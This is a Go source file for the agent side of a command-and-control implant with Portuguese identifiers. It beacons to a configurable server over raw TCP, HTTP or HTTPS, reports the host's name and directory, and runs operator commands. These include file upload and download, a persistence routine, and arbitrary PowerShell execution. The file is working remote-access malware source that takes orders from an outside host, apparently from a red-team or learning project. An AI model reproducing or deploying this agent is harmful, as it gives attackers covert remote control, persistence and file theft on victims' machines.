package main

import (
	"crypto/md5"
	"d3c/agente/commands"
	"d3c/agente/connectors"
	. "d3c/agente/helpers"
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"d3c/commons/interfaces"
	"encoding/hex"
	"os"
	"os/exec"
	"runtime"
	"time"
)

var (
	mensagem estruturas.Mensagem
)

var (
	SERVIDOR string
	PORTA    string
	CONEXAO  string
)

func getenvOr(key, fallback string) string {
	v := os.Getenv(key)
	if v == "" {
		return fallback
	}
	return v
}

func init() {
	EvitaMultiplosAgentes()

	// permite configurar via variáveis de ambiente:
	// D3C_SERVIDOR, D3C_PORTA, D3C_CONEXAO
	SERVIDOR = getenvOr("D3C_SERVIDOR", "127.0.0.1")
	PORTA = getenvOr("D3C_PORTA", "80")
	CONEXAO = getenvOr("D3C_CONEXAO", "http")

	mensagem.AgentHostname, _ = os.Hostname()
	mensagem.AgentCWD, _ = os.Getwd()
	mensagem.AgentID = geraID()
	mensagem.TempoEspera = 5
}

func main() {
	for {
		switch CONEXAO {
		case "raw":
			rawConnector := connectors.RawConnector{}
			rawConnector.Execute(SERVIDOR, PORTA, &mensagem)
		case "https":
			httpsConnector := connectors.HttpsConnector{}
			httpsConnector.Execute(SERVIDOR, PORTA, &mensagem)
		case "http":
			httpConnector := connectors.HttpConnector{}
			httpConnector.Execute(SERVIDOR, PORTA, &mensagem)
		}

		if len(mensagem.Comandos) > 0 {
			for indice, comando := range mensagem.Comandos {
				comandoId := ValidaComando(helpers.SeparaComando(comando.Comando)[0])

				if comandoId != 0 {
					mapping := map[int]interfaces.Command{
						1:  commands.Cd{Comando: comando.Comando},
						2:  commands.Ls{Comando: comando.Comando},
						3:  commands.Ps{},
						4:  commands.Pwd{},
						5:  commands.Whoami{},
						6:  commands.Sleep{Comando: comando.Comando, Mensagem: &mensagem},
						7:  commands.Send{Arquivo: comando.Arquivo},
						8:  commands.Get{Comando: comando.Comando, ComandoId: indice, Mensagem: &mensagem},
						9:  commands.Persiste{Comando: comando.Comando},
						10: commands.Msgbox{},
					}
					mensagem.Comandos[indice].Resposta = mapping[comandoId].Executar()
				} else {
					mensagem.Comandos[indice].Resposta = executaComandoEmShell(comando.Comando)
				}
			}
		}
		time.Sleep(time.Duration(mensagem.TempoEspera) * time.Second)
	}
}

func executaComandoEmShell(comandoCompleto string) (resposta string) {
	if runtime.GOOS == "windows" {
		output, _ := exec.Command("powershell.exe", "-Command", comandoCompleto).CombinedOutput()
		resposta = string(output)
	} else {
		resposta = "Sistema operacional alvo nao implementado para acesso ao shell."
	}
	return
}

func geraID() string {
	hasher := md5.New()
	hasher.Write([]byte(mensagem.AgentHostname + time.Now().String()))
	return hex.EncodeToString(hasher.Sum(nil))
}
